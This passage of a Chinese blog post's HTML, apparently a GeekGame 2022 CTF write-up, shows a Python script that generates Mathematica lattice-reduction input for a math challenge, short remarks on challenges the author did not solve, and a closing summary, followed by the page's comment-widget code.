class="mi">229</span><span class="p">,</span> <span class="mi">233</span><span class="p">,</span> <span class="mi">239</span><span class="p">,</span> <span class="mi">241</span><span class="p">,</span> <span class="mi">251</span><span class="p">,</span> <span class="mi">257</span><span class="p">,</span> <span class="mi">263</span><span class="p">,</span> <span class="mi">269</span><span class="p">,</span> <span class="mi">271</span><span class="p">]</span>

<span class="n">EXPAND</span> <span class="o">=</span> <span class="s">"10^195"</span>

<span class="k">print</span><span class="p">(</span><span class="sa">f</span><span class="s">"a0 = </span><span class="si">{</span><span class="n">primes</span><span class="p">[</span><span class="mi">0</span><span class="p">]</span><span class="si">}</span><span class="s">;"</span><span class="p">)</span>
<span class="k">for</span> <span class="n">i</span> <span class="ow">in</span> <span class="nb">range</span><span class="p">(</span><span class="mi">1</span><span class="p">,</span> <span class="nb">len</span><span class="p">(</span><span class="n">primes</span><span class="p">)):</span>
    <span class="k">print</span><span class="p">(</span><span class="sa">f</span><span class="s">"a</span><span class="si">{</span><span class="n">i</span><span class="si">}</span><span class="s"> = Round[</span><span class="si">{</span><span class="n">EXPAND</span><span class="si">}</span><span class="s"> Sqrt[</span><span class="si">{</span><span class="n">primes</span><span class="p">[</span><span class="n">i</span><span class="p">]</span><span class="si">}</span><span class="s">]];"</span><span class="p">)</span>

<span class="k">for</span> <span class="n">length</span> <span class="ow">in</span> <span class="nb">range</span><span class="p">(</span><span class="mi">20</span><span class="p">,</span> <span class="mi">58</span><span class="o">+</span><span class="mi">1</span><span class="p">):</span>

    <span class="k">print</span><span class="p">(</span><span class="s">"LatticeReduce[{"</span><span class="p">)</span>

    <span class="k">for</span> <span class="n">i</span> <span class="ow">in</span> <span class="nb">range</span><span class="p">(</span><span class="n">length</span><span class="p">):</span>
        <span class="k">print</span><span class="p">(</span><span class="s">"{"</span><span class="p">,</span> <span class="n">end</span><span class="o">=</span><span class="s">''</span><span class="p">)</span>
        <span class="k">for</span> <span class="n">j</span> <span class="ow">in</span> <span class="nb">range</span><span class="p">(</span><span class="n">length</span><span class="o">-</span><span class="mi">1</span><span class="p">):</span>
            <span class="k">if</span> <span class="n">i</span> <span class="o">==</span> <span class="n">j</span><span class="p">:</span>
                <span class="k">print</span><span class="p">(</span><span class="s">"1,"</span><span class="p">,</span> <span class="n">end</span><span class="o">=</span><span class="s">''</span><span class="p">)</span>
            <span class="k">else</span><span class="p">:</span>
                <span class="k">print</span><span class="p">(</span><span class="s">"0,"</span><span class="p">,</span> <span class="n">end</span><span class="o">=</span><span class="s">''</span><span class="p">)</span>
        <span class="k">print</span><span class="p">(</span><span class="sa">f</span><span class="s">"-a</span><span class="si">{</span><span class="n">i</span><span class="si">}</span><span class="s">"</span><span class="p">,</span> <span class="n">end</span><span class="o">=</span><span class="s">''</span><span class="p">)</span>
        <span class="k">print</span><span class="p">(</span><span class="s">"}"</span><span class="p">,</span> <span class="n">end</span><span class="o">=</span><span class="s">''</span><span class="p">)</span>
        <span class="k">if</span> <span class="n">i</span> <span class="o">!=</span> <span class="n">length</span> <span class="o">-</span> <span class="mi">1</span><span class="p">:</span>
            <span class="k">print</span><span class="p">(</span><span class="s">","</span><span class="p">,</span> <span class="n">end</span><span class="o">=</span><span class="s">''</span><span class="p">)</span>

    <span class="k">print</span><span class="p">(</span><span class="s">"}]"</span><span class="p">)</span>
</code></pre></div></div>

<p>然后肉眼找靠谱的解：</p>

<p><img src="/pictures/geekgame-2022/mathematica3.png" alt="Mathematica for Flag 3"></p>

<h2 id="没做出来的题">没做出来的题</h2>

<h3 id="我用-108-天录了个音第二小题">我用 108 天录了个音（第二小题）</h3>

<p>懒得调参数了。好像即使是没有声音，如果时长很长，生成的 ogg 还是很大，不知道怎么改。</p>

<h3 id="小-z-的服务器">小 Z 的服务器</h3>

<p>我仔细读了 OpenSSH 的源代码，最后没想通怎么让 authorized_keys 的 owner 是 root（或者 admin1）。可能要利用 SUID 程序，但是实在没自己想出来。</p>

<h3 id="简单题">简单题</h3>

<p>一开始看到，以为是要用那个 <a href="https://github.com/xoreaxeaxeax/movfuscator">movfuscator</a>。后来发现 <code class="language-plaintext highlighter-rouge">mov</code> 没法模拟 <code class="language-plaintext highlighter-rouge">syscall</code>，之后感觉像是 anti-disassemble 的技术，但是对 x86 汇编实在不熟，于是偃旗息鼓。</p>

<h3 id="混淆器">混淆器</h3>

<p>没看题。</p>

<h3 id="扫雷-ii第二三小题">扫雷 II（第二、三小题）</h3>

<p>应该没那么难，感觉自己有的地方可能没有想通。</p>

<h2 id="总结">总结</h2>

<p>挺好的，终于体验了一次比赛位列前三的感觉。希望 GeekGame 也越办越好，多整好活。</p>

<p>另外这个礼拜我的作息成功地被调到了 UTC+0。之后慢慢调回来吧。</p>


  </div>

  
    <div class="post-comments" itemprop="comment">
      <hr>
<h3>Comments</h3>
<p id="comment_darkmode_warning" style="display: none;">Note: Disqus 完整评论组件不以暗黑模式显示。</p>
<div id="disqus_thread"></div>
<link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/disqusjs@1.3/dist/disqusjs.css">
<script src="https://cdn.jsdelivr.net/npm/disqusjs@1.3/dist/disqus.js"></script>
<script>
// https://blog.skk.moe/post/prevent-disqus-from-slowing-your-site/
function loadDisqus() {
    var dsqjs = new DisqusJS({
        shortname: 'taokyblog',
        siteName: 'taoky\'s blog',
        // identifier: '',
        // url: '',
        // title: '',
        api: '//blog.taoky.moe/api/',
        apikey: 'L3W1Q35kDbi2ZGTV2iEfZ8SIksrYf847Ft0ufGon9ye1PTVxG902wO3FtIUq4wgO',
        nocomment: '无评论.',
        admin: 'taoky',
        adminLabel: 'taoky'
    });
}

// 通过检查 window 对象确认是否在浏览器中运行
var runningOnBrowser = typeof window !== "undefined";
// 通过检查 scroll 事件 API 和 User-Agent 来匹配爬虫
var isBot = runningOnBrowser && !("onscroll" in window) || typeof navigator !== "undefined" && /(gle|ing|ro|msn)bot|crawl|spider|yand|duckgo/i.test(navigator.userAgent);
// 检查当前浏览器是否支持 IntersectionObserver API
var supportsIntersectionObserver = runningOnBrowser && "IntersectionObserver" in window;

// 一个小 hack，将耗时任务包裹在 setTimeout(() => { }, 1) 中，可以推迟到 Event Loop 的任务队列中、等待主调用栈清空后才执行，在绝大部分浏览器中都有效
// 其实这个 hack 本来是用于优化骨架屏显示的。一些浏览器总是等 JavaScript 执行完了才开始页面渲染，导致骨架屏起不到降低 FCP 的优化效果，所以通过 hack 将耗时函数放到骨架屏渲染完成后再进行。
setTimeout(function () {
  if (!isBot && supportsIntersectionObserver) {
    // 当前环境不是爬虫、并且浏览器兼容 IntersectionObserver API
    var disqus_observer = new IntersectionObserver(function(entries) {
      // 当前视窗中已出现 Disqus 评论框所在位置
      if (entries[0].isIntersecting) {
        // 加载 Disqus
        loadDisqus();
        // 停止当前的 Observer
        disqus_observer.disconnect();
      }
    }, { threshold: [0] });
    // 设置让 Observer 观察 #disqus_thread 元素
    disqus_observer.observe(document.getElementById('disqus_thread'));
  } else {
    // 当前环境是爬虫、或当前浏览器其不兼容 IntersectionObserver API
    // 直接加载 Disqus
    loadDisqus();
  }
}, 1);

/**
*  RECOMMENDED CONFIGURATION VARIABLES: EDIT AND UNCOMMENT THE SECTION BELOW TO INSERT DYNAMIC VALUES FROM YOUR PLATFORM OR CMS.
*  LEARN WHY DEFINING THESE VARIABLES IS IMPORTANT: https://disqus.com/admin/universalcode/#configuration-variables*/
/*
var disqus_config = function () {
this.page.url = PAGE_URL;  // Replace PAGE_URL with your page's canonical URL variable
this.page.identifier = PAGE_IDENTIFIER; // Replace PAGE_IDENTIFIER with your page's unique identifier variable
};
*/
// (function() { // DON'T EDIT BELOW THIS LINE
// var d = document, s = d.createElement('script');
// s.src = 'https://taokyblog.disqus.com/embed.js';
// s.setAttribute('data-timestamp', +new Date());
// (d.head || d.body).appendChild(s);
// })();
</script>
<noscript>Disqus comment requires JavaScript.</noscript>
    </div>
  

</article>

      </div>
    </main>

    <footer class="site-footer">

  <div class="wrapper">

    <p>
      

Author: taoky - Subscribe via <a href="https://blog.taoky.moe/feed.xml">RSS</a>
<br>
License: <a rel="license" href="http://creativecommons.org/licenses/by-nc-sa/4.0/">知识共享署名-非商业性使用-相同方式共享 4.0 国际许可协议（CC-BY-NC-SA 4.0）</a>
    </p>

  </div>

</footer>


  </body>

</html>
